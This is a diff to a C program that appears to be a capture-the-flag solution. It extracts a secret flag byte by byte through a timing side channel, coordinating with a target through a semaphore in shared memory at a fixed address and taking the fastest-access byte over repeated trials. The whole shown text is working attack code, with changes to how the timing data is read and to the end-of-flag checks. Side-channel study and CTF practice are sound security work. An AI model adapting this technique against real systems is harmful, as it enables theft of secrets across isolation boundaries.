@@ -5,18 +5,19 @@
 #include <string.h>
 
 #define SHARED_MEM_BASE 0x1337000
-#define PAGE_SIZE 0x1000
+#define TIMING_DATA_OFFSET 0x1000
 #define NUM_TRIALS 10
 
 int main() {
     sem_t *sem = (sem_t *)SHARED_MEM_BASE;
     int *index = (int *)(sem + 1);
+    uint64_t *timing_data = (uint64_t *)(SHARED_MEM_BASE + TIMING_DATA_OFFSET);
     
     char flag[256] = {0};
     
     printf("Starting flag extraction...\n");
     
-    for (int pos = 0; pos < 100; pos++) {
+    for (int pos = 0; pos < 100; pos++) {  // Increased limit
         printf("Extracting position %d...\n", pos);
         
         uint64_t min_times[256];
@@ -32,13 +33,6 @@ int main() {
             *index = pos;
             sem_post(sem);
             usleep(5000);
-            
-            // Read timing data from each page
-            uint64_t timing_data[256];
-            for (int i = 0; i < 256; i++) {
-                uint64_t *page = (uint64_t *)(SHARED_MEM_BASE + PAGE_SIZE + PAGE_SIZE * i);
-                timing_data[i] = *page;
-            }
             
             // Find the fastest access time this trial
             uint64_t min_time = UINT64_MAX;
@@ -79,13 +73,14 @@ int main() {
                pos, (best_byte >= 0x20 && best_byte <= 0x7e) ? best_byte : '?', 
                best_byte, max_hits, best_time);
         
-        // Check for end conditions
+        // Check for end conditions first
         if (best_byte == '}' && max_hits >= 3) {
             flag[pos] = best_byte;
             flag[pos + 1] = '\0';
             printf("Found flag end '}' at position %d\n", pos);
             break;
         } else if (best_byte == 0 && max_hits >= 5) {
+            // Null byte - end of flag
             flag[pos] = '\0';
             printf("Found null terminator at position %d\n", pos);
             break;
